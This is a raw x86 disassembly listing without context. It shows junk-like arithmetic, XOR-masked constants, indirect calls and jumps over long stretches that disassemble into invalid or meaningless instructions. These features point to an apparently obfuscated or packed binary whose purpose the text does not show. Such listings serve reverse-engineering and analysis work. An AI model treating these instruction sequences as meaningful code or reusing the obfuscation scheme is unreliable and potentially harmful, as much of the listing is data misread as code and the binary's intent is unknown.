  41d3ac:	add    esi,DWORD PTR ds:0x4283d9
  41d3b2:	mov    edx,DWORD PTR ds:0x42848d
  41d3b8:	sub    edx,esi
  41d3ba:	add    esi,DWORD PTR [esi+edx*1]
  41d3bd:	mov    DWORD PTR [ebp-0xd8],0x1
  41d3c7:	mov    DWORD PTR [ebp-0x24],0x7901
  41d3ce:	mov    esi,DWORD PTR ds:0x4283a5
  41d3d4:	xor    ecx,ecx
  41d3d6:	or     ecx,DWORD PTR ds:0x4283b1
  41d3dc:	sub    esi,ecx
  41d3de:	sub    esi,DWORD PTR [esi+ecx*1]
  41d3e1:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  41d3eb:	mov    DWORD PTR [ebp-0x78],0x37f2
  41d3f2:	add    edx,eax
  41d3f4:	mov    DWORD PTR [ebp-0x10],0x62ba
  41d3fb:	mov    DWORD PTR [ebp-0x94],0x561c
  41d405:	mov    DWORD PTR [ebp-0x34],0x58bc
  41d40c:	mov    ecx,DWORD PTR ds:0x428409
  41d412:	xor    DWORD PTR ds:0x4284d5,ecx
  41d418:	mov    DWORD PTR [ebp-0x60],0x24c7
  41d41f:	mov    DWORD PTR [ebp-0x5c],0x7a45
  41d426:	adc    eax,eax
  41d428:	mov    eax,DWORD PTR [ebp-0x34]
  41d42b:	add    edx,esi
  41d42d:	mov    ecx,DWORD PTR [ebp-0x60]
  41d430:	adc    DWORD PTR ds:0x42857d,0x428339
  41d43a:	mov    edx,DWORD PTR [ebp-0x5c]
  41d43d:	neg    esi
  41d43f:	and    edx,0x160e
  41d445:	and    DWORD PTR ds:0x428569,0x7809
  41d44f:	sub    edx,ecx
  41d451:	sub    edx,0x29ad
  41d457:	cmp    DWORD PTR ds:0x428429,0x0
  41d45e:	mov    DWORD PTR ds:0x42854d,0x177e
  41d468:	mov    DWORD PTR ds:0x4284c9,0x4211
  41d472:	mov    esi,0x2b55
  41d477:	mov    ecx,DWORD PTR ds:0x4284d9
  41d47d:	jmp    0x41d4d7
  41d482:	mov    DWORD PTR ds:0x428371,edx
  41d488:	cmp    DWORD PTR ds:0x428429,0x0
  41d48f:	jbe    0x41d4cb
  41d495:	push   0x428571
  41d49a:	push   0x428165
  41d49f:	push   0x5caf
  41d4a4:	push   DWORD PTR [ebp-0x28]
  41d4a7:	push   0x7d55
  41d4ac:	call   DWORD PTR ds:0x42e080
  41d4b2:	or     DWORD PTR ds:0x428545,ebx
  41d4b8:	xor    ecx,ecx
  41d4ba:	add    ecx,DWORD PTR ds:0x428389
  41d4c0:	mov    esi,DWORD PTR ds:0x4283e5
  41d4c6:	sub    esi,ecx
  41d4c8:	and    ecx,DWORD PTR [ecx+esi*1]
  41d4cb:	or     DWORD PTR ds:0x428571,0x760f
  41d4d5:	xor    ecx,ecx
  41d4d7:	imul   edx,eax
  41d4da:	sbb    DWORD PTR ds:0x428575,edi
  41d4e0:	mov    eax,DWORD PTR [ebp-0x90]
  41d4e6:	lea    eax,[eax+edx*1+0x14f2e240]
  41d4ed:	add    edx,ecx
  41d4ef:	mov    DWORD PTR [ebp-0x174],eax
  41d4f5:	mov    eax,DWORD PTR [ebp-0x24]
  41d4f8:	mov    ecx,DWORD PTR [ebp-0x94]
  41d4fe:	mov    edx,DWORD PTR [ebp-0x10]
  41d501:	or     DWORD PTR ds:0x42836d,ecx
  41d507:	xor    edx,ecx
  41d509:	add    edx,DWORD PTR [ebp-0x78]
  41d50c:	not    ecx
  41d50e:	mov    ecx,DWORD PTR [ebp-0xc0]
  41d514:	lea    ecx,[edx+ecx*1+0x6ac1]
  41d51b:	and    ecx,eax
  41d51d:	add    esi,esi
  41d51f:	mov    eax,0x1101
  41d524:	or     esi,DWORD PTR ds:0x42857d
  41d52a:	sub    eax,ecx
  41d52c:	adc    DWORD PTR ds:0x428375,ebx
  41d532:	add    eax,DWORD PTR [ebp+0x8]
  41d535:	cmp    DWORD PTR ds:0x428561,0x0
  41d53c:	mov    DWORD PTR ds:0x428465,0x5bb
  41d546:	mov    edx,0x635
  41d54b:	mov    DWORD PTR ds:0x428465,0x7e26
  41d555:	jmp    0x41d5d0
  41d55a:	mov    DWORD PTR ds:0x428375,0x7d12
  41d564:	cmp    DWORD PTR ds:0x428561,0x0
  41d56b:	jae    0x41d5af
  41d571:	push   DWORD PTR [ebp-0x24]
  41d574:	push   0x16b6
  41d579:	push   DWORD PTR [ebp-0x10]
  41d57c:	push   0x5f53
  41d581:	push   DWORD PTR [ebp-0x1c]
  41d584:	push   DWORD PTR [ebp-0x18]
  41d587:	push   DWORD PTR [ebp-0x28]
  41d58a:	push   0x42827f
  41d58f:	call   DWORD PTR ds:0x42e2a4
  41d595:	adc    DWORD PTR ds:0x428339,0x7656
  41d59f:	sbb    DWORD PTR ds:0x428501,edx
  41d5a5:	xor    DWORD PTR ds:0x428349,0x32fd
  41d5af:	mov    edx,DWORD PTR ds:0x428439
  41d5b5:	add    edx,DWORD PTR ds:0x4284dd
  41d5bb:	mov    DWORD PTR ds:0x428439,edx
  41d5c1:	sub    esi,esi
  41d5c3:	movzx  edx,BYTE PTR ds:0x428339
  41d5ca:	add    DWORD PTR ds:0x4284f5,edx
  41d5d0:	mov    DWORD PTR [ebp-0x170],eax
  41d5d6:	mov    DWORD PTR [ebp-0x15c],0xcb79b576
  41d5e0:	mov    DWORD PTR [ebp-0x158],0x9c2b8ae8
  41d5ea:	mov    DWORD PTR [ebp-0x154],0xcb79b572
  41d5f4:	mov    DWORD PTR [ebp-0x150],0x9c2b8ae8
  41d5fe:	mov    esi,DWORD PTR [ebp-0x174]
  41d604:	mov    eax,DWORD PTR [ebp-0x154]
  41d60a:	mov    edx,DWORD PTR [ebp-0x150]
  41d610:	xor    eax,0xcb79b576
  41d615:	xor    edx,0x9c2b8ae8
  41d61b:	mov    cl,0x2
  41d61d:	call   0x408bb8
  41d622:	mov    edi,eax
  41d624:	mov    ebx,edx
  41d626:	mov    eax,DWORD PTR [ebp-0x154]
  41d62c:	jmp    0x41da13
  41d631:	out    dx,al
  41d632:	sbb    DWORD PTR [edi],eax
  41d634:	mov    dh,0x2c
  41d636:	mov    esp,0xfc579970
  41d63b:	bound  ebx,QWORD PTR [esi-0x5b77011e]
  41d641:	ja     0x41d694
  41d643:	sar    BYTE PTR [esi-0x41413bb6],0x88
  41d64a:	sti    
  41d64b:	fst    QWORD PTR [ecx+0x6be83a1]
  41d651:	dec    ebx
  41d652:	retf   0xe76f
  41d655:	jle    0x41d67c
  41d657:	(bad)  
  41d659:	cmp    DWORD PTR [eax+ecx*1+0x52],ebp
  41d65d:	ins    BYTE PTR es:[edi],dx
  41d65e:	mov    ds:0x33f741f1,al
  41d663:	retf   
  41d664:	xchg   ecx,eax
  41d665:	cmp    dh,cl
  41d667:	add    ah,BYTE PTR ds:0x57751f63
  41d66d:	nop
  41d66e:	pop    es
  41d66f:	repz fsubr DWORD PTR [ecx+0x6e]
  41d673:	sbb    eax,0x84fefdf4
  41d678:	sub    esi,DWORD PTR [ecx-0x44f5ba96]
  41d67e:	pusha  
  41d67f:	loope  0x41d625
  41d681:	and    DWORD PTR [esi],eax
  41d683:	pop    edi
  41d684:	loop   0x41d6d1
  41d686:	cdq    
  41d687:	dec    ebx
  41d688:	jb     0x41d63a
  41d68a:	add    dh,BYTE PTR [edx+0x48b82ea2]
  41d690:	or     eax,0xca8d4fdb
  41d695:	mov    ah,0xb6
  41d697:	mov    DWORD PTR [ecx],esp
  41d699:	and    DWORD PTR [eax],edi
  41d69b:	adc    esi,edi
  41d69d:	and    al,0x79
  41d69f:	pop    es
  41d6a0:	popa   
  41d6a1:	add    edi,esp
  41d6a3:	leave  
  41d6a4:	sbb    eax,0x2bc1b8ef
  41d6a9:	sub    dh,bh
  41d6ab:	lds    esi,FWORD PTR [eax-0x18]
  41d6ae:	adc    DWORD PTR [edx],esp
  41d6b0:	pop    ss
  41d6b1:	jae    0x41d6a2
  41d6b3:	lods   eax,DWORD PTR ds:[esi]
  41d6b4:	add    eax,0x7727a630
  41d6b9:	clc    
  41d6ba:	adc    esi,DWORD PTR [ecx]
  41d6bc:	cmp    eax,0xf9e5e385
  41d6c1:	xor    BYTE PTR [edx+ebp*4+0x699ff5d],0x3e
  41d6c9:	ret    
  41d6ca:	pop    ds
  41d6cb:	or     eax,0x6a67b49f
  41d6d0:	idiv   BYTE PTR [esp+eiz*2]
  41d6d3:	xchg   ebp,eax
  41d6d4:	js     0x41d714
  41d6d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6d7:	imul   eax,DWORD PTR [ebx+0x7d65d121],0x8a964d38
  41d6e1:	mov    ah,0x10
  41d6e3:	and    DWORD PTR [eax+0x53],0x9d56a581
  41d6ea:	xchg   edx,eax
  41d6eb:	bound  ebx,QWORD PTR [eax]
  41d6ed:	add    eax,0x6ac9585b
  41d6f2:	add    esp,esi
  41d6f4:	ins    DWORD PTR es:[edi],dx
  41d6f5:	or     ebp,DWORD PTR [eax+ebx*1]
  41d6f8:	and    ax,0x28fc
  41d6fc:	lea    esp,[ebp-0x554c3a26]
  41d702:	in     eax,0x61
  41d704:	adc    DWORD PTR [ecx-0xa144e4f],edx
  41d70a:	dec    edi
  41d70b:	pusha  
  41d70c:	sbb    eax,0xdbca70e8
  41d711:	test   eax,0xbcb51f8c
  41d716:	inc    ecx
  41d717:	cmp    DWORD PTR [esi+ebp*2],eax
  41d71a:	sub    dl,BYTE PTR [esi-0x7f3bf9c]
  41d720:	aas    
  41d721:	scas   al,BYTE PTR es:[edi]
  41d722:	fmulp  st(3),st
  41d724:	xchg   ecx,eax
  41d725:	push   esi
  41d726:	cmp    cl,BYTE PTR [edi+edi*2+0x34]
  41d72a:	mov    ah,0x7c
  41d72c:	test   BYTE PTR [ebx+0x317c4093],ah
  41d732:	pop    esp
  41d733:	jne    0x41d6db
  41d735:	lds    esi,FWORD PTR [ebp-0x12c5399c]
  41d73b:	sahf   
  41d73c:	pushf  
  41d73d:	sub    bh,0x3a
  41d740:	iret   
  41d741:	in     eax,0xda
  41d743:	js     0x41d779
  41d745:	lock sub DWORD PTR [esi*8-0x4aab68e1],0x9bf6b21a
  41d751:	cmp    eax,0x3f6f29ca
  41d756:	imul   ebp,DWORD PTR [ecx-0x6d],0x50
  41d75a:	sahf   
  41d75b:	imul   ebp,ebx,0xfffffff0
  41d75e:	push   es
  41d75f:	and    BYTE PTR [ebx],0xc8
  41d762:	scas   eax,DWORD PTR es:[edi]
  41d763:	lds    eax,FWORD PTR ss:[esi+ebx*1-0x7bdd75f9]
  41d76b:	mov    BYTE PTR [edx-0x49376ea8],cl
  41d771:	test   eax,0xa5bc0369
  41d776:	ret    0x79ec
  41d779:	fstp   DWORD PTR [ecx-0x3d5b59b3]
  41d77f:	aam    0xa9
  41d781:	push   ebp
  41d782:	xor    ebp,DWORD PTR [ebx-0x5d922973]
  41d788:	stc    
  41d789:	jmp    0x41d7b1
  41d78b:	and    al,BYTE PTR [eax+eiz*2]
  41d78e:	mov    bl,0x87
  41d790:	mov    eax,ds:0xe10a05f8
  41d795:	adc    BYTE PTR [esi+0x3b2a936f],ch
  41d79b:	popa   
  41d79c:	popa   
  41d79d:	loop   0x41d7b1
  41d79f:	adc    al,0xb3
  41d7a1:	loop   0x41d736
  41d7a3:	sahf   
  41d7a4:	xchg   esi,eax
  41d7a5:	loope  0x41d797
  41d7a7:	jno    0x41d7e6
  41d7a9:	dec    ecx
  41d7aa:	out    0x49,al
  41d7ac:	inc    edx
  41d7ad:	out    dx,eax
  41d7ae:	sar    DWORD PTR [ebx-0x9],cl
  41d7b1:	ins    BYTE PTR es:[edi],dx
  41d7b2:	call   0xc464:0xb8fbd9bd
  41d7b9:	pop    esp
  41d7ba:	test   eax,0xb120169e
  41d7bf:	jg     0x41d7a4
  41d7c1:	mov    ah,bh
  41d7c3:	mov    bh,0x89
  41d7c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7c6:	and    ebx,0x5e
  41d7c9:	sbb    cl,cl
  41d7cb:	imul   eax,DWORD PTR [edi+0x55],0xfffffff5
  41d7cf:	mov    gs,WORD PTR [eax+0xf]
  41d7d2:	in     al,0x31
  41d7d4:	pop    ds
  41d7d5:	inc    esi
  41d7d6:	mov    ebx,0xf29a99b4
  41d7db:	test   dl,ch
  41d7dd:	test   ebp,ebx
  41d7df:	cwde   
  41d7e0:	pop    ss
  41d7e1:	jbe    0x41d81d
  41d7e3:	mov    ebp,0x2e840a1e
  41d7e8:	pop    ds
  41d7e9:	int3   
  41d7ea:	mov    edx,0xf24cd7f9
  41d7ef:	call   0xfac2:0xf1f546b6
  41d7f6:	outs   dx,DWORD PTR ds:[esi]
  41d7f7:	push   edx
  41d7f8:	in     al,0x28
  41d7fa:	mov    WORD PTR [edx],ss
  41d7fc:	inc    edi
  41d7fd:	js     0x41d83a
  41d7ff:	push   esi
  41d800:	(bad)  
  41d801:	sub    eax,0x6b5acd9d
  41d806:	xlat   BYTE PTR ds:[ebx]
  41d807:	stos   BYTE PTR es:[edi],al
  41d808:	cmp    BYTE PTR ds:0x80589106,ch
  41d80e:	pop    esp
  41d80f:	xchg   DWORD PTR [ebx+0x74],esi
  41d812:	push   ecx
  41d813:	mov    bl,0xe7
  41d815:	aam    0x74
  41d817:	pop    edx
  41d818:	jbe    0x41d894
  41d81a:	sub    ax,WORD PTR [ecx+0x76b87491]
  41d821:	ret    
  41d822:	daa    
  41d823:	popa   
  41d824:	add    bh,BYTE PTR [ebp+0x673a9bb4]
  41d82a:	test   al,0xe4
  41d82c:	in     al,dx
  41d82d:	xor    cl,BYTE PTR [ecx+0x50648697]
  41d833:	(bad)  
  41d834:	xlat   BYTE PTR ds:[ebx]
  41d835:	out    dx,eax
  41d836:	xchg   esp,eax
  41d837:	stos   BYTE PTR es:[edi],al
  41d838:	mov    cs,ebp
  41d83a:	cmp    eax,0x5dda4d4b
  41d83f:	int    0x39
  41d841:	std    
  41d842:	and    BYTE PTR [eax+ebp*8+0x6c],bl
  41d846:	jno    0x41d8ac
  41d848:	nop
  41d849:	fist   WORD PTR [ebp+0x53]
  41d84c:	adc    BYTE PTR [ebp-0x446ab1d0],cl
  41d852:	neg    al
  41d854:	mov    ebx,0x2edf1ede
  41d859:	lods   eax,DWORD PTR ds:[esi]
  41d85a:	js     0x41d820
  41d85c:	mov    eax,ds:0x311fec01
  41d861:	xor    BYTE PTR [ebx+0x2858b083],dh
  41d867:	std    
  41d868:	sbb    edi,DWORD PTR [ebp+0x79]
  41d86b:	xchg   ebp,eax
  41d86c:	sub    al,0x1e
  41d86e:	outs   dx,DWORD PTR ds:[esi]
  41d86f:	xchg   DWORD PTR [eax],ecx
  41d871:	pop    esi
  41d872:	enter  0xc39b,0x7f
  41d876:	or     eax,0xb71eb5f3
  41d87b:	cs out 0x35,al
  41d87e:	mov    bl,0xde
  41d880:	jmp    0x9ea:0xded07c21
  41d887:	sbb    al,0x95
  41d889:	fidiv  WORD PTR [edi-0x527ebe6f]
  41d88f:	stos   DWORD PTR es:[edi],eax
  41d890:	mov    BYTE PTR [ebx-0x80],bh
  41d893:	(bad)  
  41d894:	pop    ebp
  41d895:	or     DWORD PTR [ebx+ebp*8-0x78453a4e],ebx
  41d89c:	lock and BYTE PTR [ebx-0x21],al
  41d8a0:	pop    ss
  41d8a1:	out    dx,eax
  41d8a2:	push   ss
  41d8a3:	mov    eax,ds:0x5b3123e2
  41d8a8:	dec    ecx
  41d8a9:	seto   BYTE PTR [ecx-0x46]
  41d8ad:	sar    eax,0xaf
  41d8b0:	xor    bl,BYTE PTR [edx+0x5e]
  41d8b3:	dec    edx
  41d8b4:	jle    0x41d913
  41d8b6:	imul   esi,DWORD PTR [ecx-0x2f685969],0x711c2d8f
  41d8c0:	pusha  
  41d8c1:	sahf   
  41d8c2:	ss and ch,dh
  41d8c5:	xor    DWORD PTR ss:[eax-0x17b81dd2],esp
  41d8cc:	xor    DWORD PTR [edi-0x6f],eax
  41d8cf:	mov    bh,0xfa
  41d8d1:	sbb    ebx,DWORD PTR [eax+eax*8+0x270a864]
  41d8d8:	mov    ds:0xe90f26e9,al
  41d8dd:	xor    eax,0x3cd167d6
  41d8e2:	daa    
  41d8e3:	retf   0x59ef
  41d8e6:	mov    bl,ah
  41d8e8:	jp     0x41d8b5
  41d8ea:	lods   al,BYTE PTR ds:[esi]
  41d8eb:	std    
  41d8ec:	jno    0x41d8ea
  41d8ee:	sbb    eax,0xa627334d
  41d8f3:	sub    BYTE PTR [ebp-0x3b],dl
  41d8f6:	cmp    BYTE PTR [edi+edi*2],cl
  41d8f9:	retf   0xd983
  41d8fc:	mov    bh,0x8d
  41d8fe:	sti    
  41d8ff:	adc    al,0x50
  41d901:	add    eax,0x8a741f60
  41d906:	pmaddwd mm0,QWORD PTR [ebx]
  41d909:	pop    edi
  41d90a:	fst    DWORD PTR ds:0xc0bf6dbf
  41d910:	jns    0x41d8ff
  41d912:	pop    esp
  41d913:	(bad)  
  41d914:	cli    
  41d915:	outs   dx,BYTE PTR ds:[esi]
  41d916:	mul    BYTE PTR [esi+0x2c3105b2]
  41d91c:	and    al,0x87
  41d91e:	pop    ecx
  41d91f:	mov    ch,0x1f
  41d921:	je     0x41d953
  41d923:	mov    DWORD PTR [ecx+0x7b],edi
  41d926:	fwait
  41d927:	dec    ebp
  41d928:	push   edi
  41d929:	or     esi,DWORD PTR [eax]
  41d92b:	shl    DWORD PTR [edx],0x72
  41d92e:	mov    eax,esi
  41d930:	pop    ss
  41d931:	mov    dh,0xc1
  41d933:	dec    ebx
  41d934:	jp     0x41d978
  41d936:	(bad)  
  41d938:	and    BYTE PTR [ebp+0x5b],ch
  41d93b:	or     DWORD PTR [ebx+edx*1+0x6],ecx
  41d93f:	mov    eax,0x1c5c5a67
  41d944:	sbb    edx,DWORD PTR [ebp-0x2366c18d]
  41d94a:	fst    DWORD PTR [esi+eiz*2]
  41d94d:	imul   ebp,DWORD PTR [edx+0x19caff45],0xd797c8ca
  41d957:	bound  edi,QWORD PTR [esi]
  41d959:	std    
  41d95a:	sbb    BYTE PTR [ebp+0x43],dh
  41d95d:	and    esi,DWORD PTR [edx]
  41d95f:	in     al,dx
  41d960:	xchg   edi,eax
  41d961:	(bad)  
  41d962:	mov    ebp,0x9eb1f484
  41d967:	xlat   BYTE PTR ds:[ebx]
  41d968:	ficom  DWORD PTR [ecx-0x578d4cf]
  41d96e:	das    
  41d96f:	(bad)  
  41d970:	mov    edx,0xcdfbf620
  41d975:	push   cs
  41d976:	(bad)  [eax+0xf4e0db4]
  41d97c:	push   ds
  41d97d:	and    dh,BYTE PTR [esi+0xf3e463b]
  41d983:	fsub   DWORD PTR [ecx-0x5c]
  41d986:	or     eax,0x1a674dc6
  41d98b:	push   edi
  41d98c:	mov    ecx,0xb20ba035
  41d991:	mov    ds:0xce359aae,eax
  41d996:	les    ebp,FWORD PTR [edi-0x18cbd0f8]
  41d99c:	(bad)  
  41d99e:	dec    esp
  41d99f:	mov    BYTE PTR [esi+0x5982cb59],al
  41d9a5:	sub    DWORD PTR [ebp-0x22],ecx
  41d9a8:	mov    ch,0x14
  41d9aa:	push   esi
  41d9ab:	sbb    eax,0x28361677
  41d9b0:	pop    eax
  41d9b1:	fcom   DWORD PTR [eax+edi*1-0x73]
  41d9b5:	xchg   ecx,eax
  41d9b6:	in     al,dx
  41d9b7:	mov    esi,0xe1a53ee
  41d9bc:	or     DWORD PTR [esi+ebp*2+0x21],esi
  41d9c0:	clc    
  41d9c1:	mov    esi,0xd8aeea06
  41d9c6:	cli    
  41d9c7:	add    dl,BYTE PTR [ecx]
  41d9c9:	push   cs
  41d9ca:	mov    esi,eax
  41d9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9cd:	imul   ebp,DWORD PTR [edi+0x326aefde],0xffffffac
  41d9d4:	lock mov eax,0xbad12208
  41d9da:	inc    eax
  41d9db:	cli    
  41d9dc:	ss xchg edi,eax
  41d9de:	sbb    BYTE PTR [ebp+0x79b50b77],cl
  41d9e4:	lahf   
  41d9e5:	rol    edx,0xcb
  41d9e8:	cdq    
  41d9e9:	lods   al,BYTE PTR ds:[esi]
  41d9ea:	xchg   esi,eax
  41d9eb:	popf   
  41d9ec:	div    BYTE PTR [esi-0x4998be1]
  41d9f2:	inc    esp
  41d9f3:	sahf   
  41d9f4:	mov    al,0x38
  41d9f6:	inc    edi
  41d9f7:	and    DWORD PTR [ecx-0x71],0x3d5cad85
  41d9fe:	jmp    0xe284:0x57896542
  41da05:	mov    bh,0x3f
  41da07:	lea    ecx,[edi+ebp*8-0x65f64dab]
  41da0e:	int    0xea
  41da10:	(bad)  
  41da11:	stc    
  41da12:	inc    ebx
  41da13:	mov    edx,DWORD PTR [ebp-0x150]
  41da19:	xor    eax,0xcb79b576
  41da1e:	xor    edx,0x9c2b8ae8
  41da24:	mov    cl,0x3e
  41da26:	call   0x4223f7
  41da2b:	or     edi,eax
  41da2d:	or     ebx,edx
  41da2f:	mov    eax,DWORD PTR [ebp-0x15c]
  41da35:	mov    edx,DWORD PTR [ebp-0x158]
  41da3b:	jmp    0x41de22
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	cdq    
  41da42:	bound  ebp,QWORD PTR fs:[esp+edi*4+0x63179970]
  41da4a:	xor    bl,ch
  41da4c:	fstp   DWORD PTR [ecx+0x59039e50]
  41da52:	sar    BYTE PTR [esi-0x41413bb6],0xe7
  41da59:	pop    es
  41da5a:	add    ecx,DWORD PTR [ecx+0x6ae5b43a]
  41da60:	pop    ebp
  41da61:	mov    esi,0xec949058
  41da66:	cmc    
  41da67:	or     esi,DWORD PTR [esi+0x5d]
  41da6a:	mov    bl,0x2b
  41da6c:	call   0x16d8:0xd0061497
  41da73:	rol    DWORD PTR [edi+0x6d3c42a7],1
  41da79:	scas   al,BYTE PTR es:[edi]
  41da7a:	pop    esi
  41da7b:	sbb    BYTE PTR [edx],ch
  41da7d:	push   eax
  41da7e:	pop    esp
  41da7f:	mov    ax,WORD PTR [ebx+0x17]
  41da83:	pop    ecx
  41da84:	mul    DWORD PTR [edi+0x53]
  41da87:	push   esi
  41da88:	adc    eax,0xd49b2a6c
  41da8d:	test   DWORD PTR [edx],esi
  41da8f:	mov    dl,0xdf
  41da91:	mov    eax,ds:0x50d9ca21
  41da96:	lea    eax,[eax-0x27]
  41da99:	xchg   esp,eax
  41da9a:	pop    esi
  41da9b:	gs mov bh,0x1e
  41da9e:	aad    0xf
  41daa0:	test   edi,esi
  41daa2:	adc    DWORD PTR [ebp+edi*2-0x45d26bb3],ebx
  41daa9:	fcmovnu st,st(3)
  41daab:	jns    0x41dad5
  41daad:	aad    0x9b
  41daaf:	fidiv  WORD PTR [edi-0x45344137]
  41dab5:	rcr    DWORD PTR [esi+0xd010ebc],0x6
  41dabc:	mov    esi,0xa647b2af
  41dac1:	xor    BYTE PTR [edi-0x68],ah
  41dac4:	fldcw  WORD PTR [esi]
  41dac6:	or     eax,0xd810d523
  41dacb:	mov    BYTE PTR [ecx+0xab5a6a4],ch
  41dad1:	sti    
  41dad2:	repz cmp ebp,ecx
  41dad5:	push   ebx
  41dad6:	push   ebx
  41dad7:	call   0x65e7218
  41dadc:	mov    al,0x32
  41dade:	fs nop
  41dae0:	ss (bad) 
  41dae2:	jg     0x41da98
  41dae4:	sahf   
  41dae5:	sub    ch,BYTE PTR [edx+0x772fb6f3]
  41daeb:	in     eax,dx
  41daec:	xor    eax,0xf7b7dd26
  41daf1:	jb     0x41dade
  41daf3:	and    al,0x34
  41daf5:	fwait
  41daf6:	or     eax,ebp
  41daf8:	into   
  41daf9:	inc    ebx
  41dafa:	push   ecx
  41dafb:	int    0x86
  41dafd:	add    eax,esp
  41daff:	push   edi
  41db00:	mov    ds:0x578c0e6e,al
  41db05:	(bad)  
  41db07:	mov    al,0x0
  41db09:	imul   eax,DWORD PTR [edi+0x717e39f2],0x4b18714d
  41db13:	repnz xchg ebp,eax
  41db15:	push   edi
  41db16:	imul   eax
  41db18:	out    0x9a,eax
  41db1a:	xor    BYTE PTR [edi+0x2b],bl
  41db1d:	dec    esp
  41db1e:	repnz dec eax
  41db20:	das    
  41db21:	repz add eax,0xef84b49f
  41db27:	in     al,0xd3
  41db29:	call   0x2a0b:0x32429a0b
  41db30:	test   al,0xee
  41db32:	test   cl,ch
  41db34:	data16 gs loopne 0x41dbaa
  41db38:	sahf   
  41db39:	test   eax,0x3f35e0dc
  41db3e:	mov    ebx,0x169cbc85
  41db43:	leave  
  41db44:	or     ah,BYTE PTR [ebx]
  41db46:	int    0xc6
  41db48:	ins    BYTE PTR es:[edi],dx
  41db49:	mov    DWORD PTR [esp+esi*2+0x66],edx
  41db4d:	push   ecx
  41db4e:	dec    edx
  41db4f:	in     al,dx
  41db50:	sbb    ah,BYTE PTR [ecx]
  41db52:	iret   
  41db53:	xchg   ecx,eax
  41db54:	daa    
  41db55:	fwait
  41db56:	add    DWORD PTR [edi],eax
  41db58:	lock and ah,BYTE PTR [eax-0x221ba371]
  41db5f:	fsub   st,st(4)
  41db61:	add    BYTE PTR [ecx+0x32930b74],0xf9
  41db68:	cmp    edi,edi
  41db6a:	test   al,0x30
  41db6c:	push   ebp
  41db6d:	jns    0x41db51
  41db6f:	ror    esi,1
  41db71:	xor    eax,0x39faf0fc
  41db76:	enter  0xe423,0x61
  41db7a:	and    DWORD PTR [ebp-0x2bdc15b6],eax
  41db80:	pop    edi
  41db81:	(bad)  
  41db82:	aam    0xd2
  41db84:	mov    dh,0x35
  41db86:	xchg   ebp,eax
  41db87:	mov    ebp,DWORD PTR [ebp-0x1c]
  41db8a:	and    ecx,DWORD PTR [ecx-0x6a3398f3]
  41db90:	mov    ebp,esi
  41db92:	inc    eax
  41db93:	retf   
  41db94:	sub    al,0x51
  41db96:	inc    edi
  41db97:	mov    ?,ecx
  41db99:	jl     0x41db71
  41db9b:	and    edx,DWORD PTR [edi]
  41db9d:	(bad)  
  41db9e:	xchg   ebx,eax
  41db9f:	pop    ecx
  41dba0:	sbb    al,0x41
  41dba2:	int3   
  41dba3:	sub    DWORD PTR [eax+0x601960a6],edi
  41dba9:	cld    
  41dbaa:	or     edi,esi
  41dbac:	pop    edi
  41dbad:	imul   DWORD PTR [edi]
  41dbaf:	aaa    
  41dbb0:	inc    ebp
  41dbb1:	or     ah,dh
  41dbb3:	xor    ebp,DWORD PTR [edi+edx*1+0x57e45297]
  41dbba:	add    DWORD PTR [esi-0x45],eax
  41dbbd:	das    
  41dbbe:	std    
  41dbbf:	rcl    DWORD PTR ds:0xd581cef1,cl
  41dbc5:	pop    esi
  41dbc6:	stos   DWORD PTR es:[edi],eax
  41dbc7:	dec    eax
  41dbc8:	cwde   
  41dbc9:	cdq    
  41dbca:	push   ss
  41dbcb:	popa   
  41dbcc:	pushf  
  41dbcd:	ror    DWORD PTR [ecx-0x54d55002],1
  41dbd3:	stos   DWORD PTR es:[edi],eax
  41dbd4:	adc    al,0x8d
  41dbd6:	and    BYTE PTR [edi+0x6adf96c0],cl
  41dbdc:	xor    al,0x70
  41dbde:	popa   
  41dbdf:	scas   al,BYTE PTR es:[edi]
  41dbe0:	je     0x41db77
  41dbe2:	cld    
  41dbe3:	int    0xdb
  41dbe5:	mov    esi,0x88d0e95b
  41dbea:	cmc    
  41dbeb:	and    dl,BYTE PTR [esp+edx*4]
  41dbee:	and    al,0x6c
  41dbf0:	mov    ds:0xe20da77c,al
  41dbf5:	sahf   
  41dbf6:	push   0x5f20bcf0
  41dbfb:	push   ebp
  41dbfc:	aam    0x4c
  41dbfe:	dec    esp
  41dbff:	push   si
  41dc01:	add    BYTE PTR [eax+0x4c],ch
  41dc04:	lds    ebx,FWORD PTR [ebp+0x74ec149a]
  41dc0a:	sahf   
  41dc0b:	sbb    cl,BYTE PTR [esi+0xb]
  41dc0e:	mov    eax,0xff0200bc
  41dc13:	(bad)  
  41dc14:	call   0x36278187
  41dc19:	mov    esp,0x469ca066
  41dc1e:	test   cl,bl
  41dc20:	add    eax,0xb555d9ca
  41dc25:	(bad)  
  41dc26:	push   cs
  41dc27:	pop    esp
  41dc28:	out    dx,al
  41dc29:	mov    eax,ds:0xc94d7634
  41dc2e:	sbb    al,0xbc
  41dc30:	mov    ebx,0x396b62ea
  41dc35:	inc    eax
  41dc36:	cmp    ebp,DWORD PTR [ebx]
  41dc38:	js     0x41dbf0
  41dc3a:	push   ebx
  41dc3b:	std    
  41dc3c:	iret   
  41dc3d:	daa    
  41dc3e:	cs push 0xfffffff4
  41dc41:	(bad)  
  41dc43:	outs   dx,BYTE PTR ds:[esi]
  41dc44:	pop    edx
  41dc45:	mov    DWORD PTR [esp+ebx*8-0x2683981d],eax
  41dc4c:	rcr    BYTE PTR [edi],cl
  41dc4e:	stc    
  41dc4f:	icebp  
  41dc50:	pop    ecx
  41dc51:	lods   al,BYTE PTR ds:[esi]
  41dc52:	mov    ecx,0xc2f4f1ef
  41dc57:	shl    bh,cl
  41dc59:	xchg   DWORD PTR [esi-0x41161c28],edi
  41dc5f:	ins    DWORD PTR es:[edi],dx
  41dc60:	mov    bl,0x50
  41dc62:	fidivr DWORD PTR [esi]
  41dc64:	imul   esi,DWORD PTR [ecx+0xb7bf66f],0x16
  41dc6b:	test   DWORD PTR [esi-0x22],0xffd6bf03
  41dc72:	mov    ds:0xeef3ef42,al
  41dc77:	lods   eax,DWORD PTR ds:[esi]
  41dc78:	xor    BYTE PTR [edx],ah
  41dc7a:	out    dx,al
  41dc7b:	sahf   
  41dc7c:	sbb    al,0x94
  41dc7e:	ins    BYTE PTR es:[edi],dx
  41dc7f:	retf   0x10dc
  41dc82:	(bad)  
  41dc83:	jmp    0x41dcdf
  41dc85:	inc    eax
